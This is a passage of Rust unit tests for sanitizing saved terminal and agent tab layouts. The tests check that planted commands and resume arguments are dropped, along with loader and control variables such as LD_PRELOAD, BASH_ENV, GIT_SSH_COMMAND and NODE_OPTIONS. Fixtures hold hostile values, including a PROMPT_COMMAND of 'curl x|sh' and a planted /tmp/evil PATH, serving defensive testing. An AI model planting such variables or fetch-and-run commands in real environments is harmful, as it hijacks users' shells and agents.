        extra.insert("kind".to_string(), Value::String("local_agent".to_string()));
        TabEntry {
            key: "t1".to_string(),
            label: "Shell".to_string(),
            cmd: cmd.to_string(),
            cwd: "/tmp".to_string(),
            session_id: Some("00000000-0000-0000-0000-000000000000".to_string()),
            extra,
        }
    }

    fn known() -> HashSet<String> {
        let mut set: HashSet<String> = HashSet::new();
        set.insert(String::new());
        for c in PANE_MARKER_CMDS
            .iter()
            .chain(AGENT_CMDS)
            .chain(SCRIPT_INTERP_CMDS)
        {
            set.insert((*c).to_string());
        }
        set
    }

    fn no_custom() -> HashMap<String, CustomAgentSpec> {
        HashMap::new()
    }

    fn spec(resume: &[&str], env: &[(&str, &str)]) -> CustomAgentSpec {
        CustomAgentSpec {
            resume: resume.iter().map(|a| a.to_string()).collect(),
            env: env.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
        }
    }

    fn env_keys(tab: &TabEntry) -> Option<Vec<String>> {
        let mut keys: Vec<String> = tab.extra.get("env")?.as_object()?.keys().cloned().collect();
        keys.sort();
        Some(keys)
    }

    fn resume_args(tab: &TabEntry) -> Option<Vec<String>> {
        Some(
            tab.extra
                .get("resumeArgs")?
                .as_array()?
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_string)
                .collect(),
        )
    }

    #[test]
    fn unknown_command_is_downgraded_to_a_plain_shell() {
        // Variant B of the persisted-layout escape: a planted `shell` entry whose
        // cmd is a script the same writer dropped into the project.
        let mut tabs = vec![entry("/home/u/proj/pwn.sh")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "");
        assert!(tabs[0].session_id.is_none());
        assert!(!tabs[0].extra.contains_key("resumeArgs"));
        assert!(!tabs[0].extra.contains_key("env"));
        assert!(!tabs[0].extra.contains_key("location"));
        // The tab itself survives — restore never silently loses a pane.
        assert_eq!(tabs[0].label, "Shell");
        assert_eq!(tabs[0].cwd, "/tmp");
        assert_eq!(tabs[0].key, "t1");
        assert!(tabs[0].extra.contains_key("kind"));
    }

    #[test]
    fn bash_dash_c_payload_is_downgraded_even_though_bash_is_a_run_interpreter() {
        // `bash` is a legitimate Run-tab interpreter, so it stays known — but its
        // authority fields only survive because the cmd is known; the argv itself
        // is what `pty_spawn`'s authority resolution and the container now bound.
        let mut tabs = vec![entry("bash"), entry("definitely-not-an-agent")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "bash");
        assert_eq!(tabs[1].cmd, "");
    }

    #[test]
    fn known_commands_keep_every_field_except_resume_args_and_denied_env() {
        for cmd in [
            "",
            "claude",
            "codex",
            "vibe",
            crate::app_tab_command!("files"),
            crate::app_tab_command!("mail"),
            "zsh",
        ] {
            let mut tabs = vec![entry(cmd)];
            sanitize_tab_layout(&mut tabs, &known(), &no_custom());
            assert_eq!(tabs[0].cmd, cmd, "'{cmd}' must be accepted verbatim");
            assert!(
                tabs[0].session_id.is_some(),
                "'{cmd}' must keep its session id"
            );
            assert!(
                tabs[0].extra.contains_key("location"),
                "'{cmd}' keeps locality"
            );
            // A trusted (state-dir) load keeps the env and the embed, minus
            // the variables no layout may set.
            let mut want = vec![crate::app_env!("TAB_UID").to_string(), "VIBE_HOME".to_string()];
            want.sort();
            assert_eq!(env_keys(&tabs[0]), Some(want), "'{cmd}' keeps its env minus LD_PRELOAD");
            assert!(tabs[0].extra.contains_key("embedExec"), "'{cmd}' keeps embedExec");
        }
    }

    #[test]
    fn untrusted_layouts_drop_env_and_embed_exec_for_known_commands() {
        // Gap 17: a known `cmd` kept its `env` at the untrusted doors, so an
        // imported bundle or an adopted folder chose PATH or LD_PRELOAD for a
        // plain shell tab. Nothing the tab brought survives.
        for cmd in ["", "claude", "bash", "sh", "zsh", "vibe"] {
            let mut tabs = vec![entry(cmd)];
            tabs[0]
                .extra
                .insert("env".to_string(), serde_json::json!({ "FOO": "bar", "PATH": "/tmp/evil" }));
            sanitize_untrusted_layout_with(&mut tabs, &no_custom());
            assert_eq!(tabs[0].cmd, cmd, "'{cmd}' stays known");
            assert!(!tabs[0].extra.contains_key("env"), "'{cmd}' loses env");
            assert!(!tabs[0].extra.contains_key("embedExec"), "'{cmd}' loses embedExec");
            // Identity stays: the frontend rebuilds TAB_UID from it.
            assert!(tabs[0].session_id.is_some(), "'{cmd}' keeps its session id");
        }
    }

    #[test]
    fn an_untrusted_custom_agent_tab_gets_its_settings_env_only() {
        let custom = HashMap::from([(
            "my-agent".to_string(),
            spec(&["--continue"], &[("MY_AGENT_HOME", "/home/u/.my-agent"), ("PATH", "/opt/my-agent/bin")]),
        )]);
        let mut tabs = vec![entry("my-agent")];
        tabs[0]
            .extra
            .insert("env".to_string(), serde_json::json!({ "PATH": "/tmp/evil", "PLANTED": "1" }));
        sanitize_untrusted_layout_with(&mut tabs, &custom);
        assert_eq!(tabs[0].cmd, "my-agent");
        assert_eq!(
            tabs[0].extra.get("env"),
            Some(&serde_json::json!({ "MY_AGENT_HOME": "/home/u/.my-agent", "PATH": "/opt/my-agent/bin" }))
        );

        // A custom agent with no env in its spec gets none.
        let custom = HashMap::from([("my-agent".to_string(), spec(&[], &[]))]);
        let mut tabs = vec![entry("my-agent")];
        sanitize_untrusted_layout_with(&mut tabs, &custom);
        assert!(!tabs[0].extra.contains_key("env"));
    }

    #[test]
    fn a_state_dir_layout_loses_loader_and_control_variables() {
        let mut tabs = vec![entry("")];
        let mut env = serde_json::json!({
            "PATH": "/tmp/evil:/usr/bin",
            "LD_PRELOAD": "/tmp/x.so",
            "DYLD_INSERT_LIBRARIES": "/tmp/x.dylib",
            "BASH_ENV": "/tmp/rc",
            "PROMPT_COMMAND": "curl x|sh",
            "GIT_CONFIG_COUNT": "1",
            "GIT_SSH_COMMAND": "sh -c x",
            "SSH_ASKPASS": "/tmp/x",
            "XDG_CONFIG_HOME": "/tmp/cfg",
            "NODE_OPTIONS": "--require /tmp/x.js",
            "VIBE_MCP_SERVERS": "[]",
            "HOME": "/tmp",
            crate::app_env!("HOST_SESSION"): "1",
            crate::app_env!("AGENT_FENCE"): "1",
            crate::app_env!("SCOPE"): "other",
            crate::services::root_mcp::TOKEN_ENV: "planted",
            "VIBE_HOME": "/home/u/.vibe-local",
            crate::app_env!("TAB_UID"): "uid-1",
            crate::app_env!("LOCAL_MODEL"): "qwen3:8b",
            "PY_TARGET_FIXTURE": "main.py",
            "XDG_SESSION_TYPE": "x11",
        });
        if let Some(old) = crate::brand::PAIR.legacy_env_name("HOST_SESSION") {
            env[old] = Value::String("1".into());
        }
        tabs[0].extra.insert("env".to_string(), env);
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        let mut want: Vec<String> = [
            crate::app_env!("LOCAL_MODEL"),
            crate::app_env!("TAB_UID"),
            "PY_TARGET_FIXTURE",
            "VIBE_HOME",
            "XDG_SESSION_TYPE",
        ]
        .map(str::to_string)
        .to_vec();
        want.sort();
        assert_eq!(env_keys(&tabs[0]), Some(want));

        // An env that is not an object is dropped whole.
        let mut tabs = vec![entry("")];
        tabs[0].extra.insert("env".to_string(), serde_json::json!(["PATH=/tmp/evil"]));
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert!(!tabs[0].extra.contains_key("env"));
    }

    #[test]
    fn a_custom_agents_spec_env_survives_and_a_differing_value_is_dropped() {
        let custom = HashMap::from([(
            "my-agent".to_string(),
            spec(&[], &[("PATH", "/opt/my-agent/bin"), ("NODE_OPTIONS", "--max-old-space-size=4096")]),
        )]);
        let set = known_tab_commands(&custom);
        let mut tabs = vec![entry("my-agent")];
        tabs[0].extra.insert(
            "env".to_string(),
            serde_json::json!({
                "PATH": "/opt/my-agent/bin",
                "NODE_OPTIONS": "--require /tmp/x.js",
                "LD_PRELOAD": "/tmp/x.so",
                "MY_AGENT_FLAG": "1",
            }),
        );
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(
            tabs[0].extra.get("env"),
            Some(&serde_json::json!({ "PATH": "/opt/my-agent/bin", "MY_AGENT_FLAG": "1" }))
        );

        // The spec's value is honoured for its own command only.
        let mut tabs = vec![entry("claude")];
        tabs[0].extra.insert("env".to_string(), serde_json::json!({ "PATH": "/opt/my-agent/bin" }));
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(tabs[0].extra.get("env"), Some(&serde_json::json!({})));
    }

    #[test]
    fn a_local_launch_survives_only_as_a_line_app_builds() {
        let launch = |cmd: &str, args: Value| {
            let mut tab = entry(cmd);
            tab.extra.insert(
                LOCAL_LAUNCH_KEY.to_string(),
                serde_json::json!({ "driver": "claude", "model": "qwen3:8b", "args": args }),
            );
            tab
        };
        let mut tabs = vec![
            launch("ollama", serde_json::json!(["launch", "claude", "--model", "qwen3:8b"])),
            launch("ollama", serde_json::json!(["launch", "claude", "--model", "qwen3:8b", "--yes"])),
            launch("ollama", serde_json::json!(["serve"])),
            launch("/tmp/pwn", serde_json::json!(["launch", "claude", "--model", "qwen3:8b"])),
        ];
        // Only a local-model tab carries one.
        let mut shell = launch("ollama", serde_json::json!(["launch", "claude", "--model", "qwen3:8b"]));
        shell.extra.insert("kind".to_string(), Value::String("shell".to_string()));
        tabs.push(shell);
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        let kept: Vec<bool> = tabs.iter().map(|t| t.extra.contains_key(LOCAL_LAUNCH_KEY)).collect();
        assert_eq!(kept, [true, false, false, false, false]);

        // A folder copy never brings one back, valid or not.
        let mut tabs = vec![launch("ollama", serde_json::json!(["launch", "claude", "--model", "qwen3:8b"]))];
        sanitize_untrusted_layout(&mut tabs);
        assert!(!tabs[0].extra.contains_key(LOCAL_LAUNCH_KEY));
    }

    #[test]
    fn a_custom_agent_command_is_accepted_when_registered() {
        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(
            tabs[0].cmd, "",
            "unregistered custom command is neutralized"
        );

        let custom = HashMap::from([("my-agent".to_string(), spec(&["--continue"], &[]))]);
        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &known_tab_commands(&custom), &custom);
        assert_eq!(tabs[0].cmd, "my-agent");
    }

    #[test]
    fn a_built_in_agents_persisted_resume_argv_is_dropped() {
        // The residual half of the persisted-layout escape: `cmd` alone was enough
        // to keep `resumeArgs`, and for the host-bound agent CLIs that argv is
        // executed on the HOST (the container is deliberately skipped for them). The
        // frontend rebuilds a built-in's flag from RESUMABLE_AGENTS, so the
        // persisted vector is redundant as well as dangerous.
        for cmd in [
            "claude", "codex", "vibe", "opencode", "droid", "openclaw", "ollama",
        ] {
            let mut tabs = vec![entry(cmd)];
            sanitize_tab_layout(&mut tabs, &known(), &no_custom());
            assert_eq!(tabs[0].cmd, cmd);
            assert_eq!(
                resume_args(&tabs[0]),
                None,
                "'{cmd}' must not carry a persisted resume argv",
            );
        }
    }

    #[test]
    fn a_custom_agents_resume_argv_is_rebuilt_from_its_settings_spec() {
        // The spec in settings.json is authoritative, so a planted vector is
        // replaced by it rather than trusted — and a launch-only custom agent
        // (no resume flag in its spec) loses the field entirely.
        let custom = HashMap::from([
            ("my-agent".to_string(), spec(&["--continue"], &[])),
            ("launch-only".to_string(), spec(&[], &[])),
        ]);
        let set = known_tab_commands(&custom);

        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(resume_args(&tabs[0]), Some(vec!["--continue".to_string()]));

        let mut tabs = vec![entry("launch-only")];
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(resume_args(&tabs[0]), None);
    }

    #[test]
    fn schedule_targets_survive_state_load_but_not_project_tree_adoption() {
        let mut state_tab = entry("claude");
        state_tab.extra.insert(
            SCHEDULE_TARGET_KEY.to_string(),
            Value::String("local-target".to_string()),
        );
        let mut state = vec![state_tab.clone()];
        sanitize_loaded_layout(&mut state);
        assert_eq!(
            state[0].extra.get(SCHEDULE_TARGET_KEY),
            Some(&Value::String("local-target".to_string()))
        );

        let mut adopted = vec![state_tab];
        sanitize_untrusted_layout(&mut adopted);
        assert!(!adopted[0].extra.contains_key(SCHEDULE_TARGET_KEY));
    }

    #[test]
    fn project_tree_export_omits_schedule_target_bindings() {
        let dir = tempfile::tempdir().expect("temp project");
        let local_file = dir.path().join("project.json");
        let mut tab = entry("claude");
        tab.extra.insert(
            SCHEDULE_TARGET_KEY.to_string(),
            Value::String("local-target".to_string()),
        );
        let session = TerminalSession {
            tab_layout: vec![tab],
            ..TerminalSession::default()
        };

        write_export_copy(&local_file.to_string_lossy(), &session);

        let exported: TerminalSession = storage::read_json(
            &dir.path().join(concat!(".", crate::app_slug!(), "/sessions")).join(TERMINALS_FILE),
        )
        .expect("read export");
        assert!(!exported.tab_layout[0]
            .extra
            .contains_key(SCHEDULE_TARGET_KEY));
        assert!(session.tab_layout[0]
            .extra
            .contains_key(SCHEDULE_TARGET_KEY));
    }

    #[cfg(unix)]
    #[test]
    fn project_tree_export_is_not_rewritten_when_unchanged() {
        use std::os::unix::fs::MetadataExt;
        let dir = tempfile::tempdir().expect("temp project");
        let local_file = dir.path().join("project.json");
        let path = dir
            .path()
            .join(concat!(".", crate::app_slug!(), "/sessions"))
            .join(TERMINALS_FILE);
        // A fresh `entry` per save, as each save arrives from the renderer: its
        // `extra` map hashes its several keys into a different order.
        let session = |active_tab_index| TerminalSession {
            tab_layout: vec![entry("claude")],
            active_tab_index,
            ..TerminalSession::default()
        };

        write_export_copy(&local_file.to_string_lossy(), &session(0));
        let first = std::fs::metadata(&path).expect("export written").ino();
        // The atomic write renames a fresh file into place, so a rewrite
        // shows as a new inode.
        for _ in 0..8 {
            write_export_copy(&local_file.to_string_lossy(), &session(0));
        }
        assert_eq!(std::fs::metadata(&path).expect("export").ino(), first);

        write_export_copy(&local_file.to_string_lossy(), &session(1));
        assert_ne!(std::fs::metadata(&path).expect("export").ino(), first);
        let exported: TerminalSession = storage::read_json(&path).expect("read export");
        assert_eq!(exported.active_tab_index, 1);
    }
}
